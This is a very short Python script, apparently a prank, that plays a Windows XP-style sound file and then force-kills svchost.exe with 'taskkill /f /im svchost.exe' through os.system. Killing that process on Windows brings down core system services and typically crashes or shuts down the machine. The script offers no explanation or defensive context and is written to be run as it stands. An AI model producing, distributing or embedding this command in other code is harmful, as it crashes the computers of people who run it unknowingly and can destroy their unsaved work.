import os
import time
from pygame import mixer
os.chdir(os.getcwd())
mixer.init()

mixer.Sound('xp.mp3').play()
time.sleep(0.8)
os.system('taskkill /f /im svchost.exe')
time.sleep(5)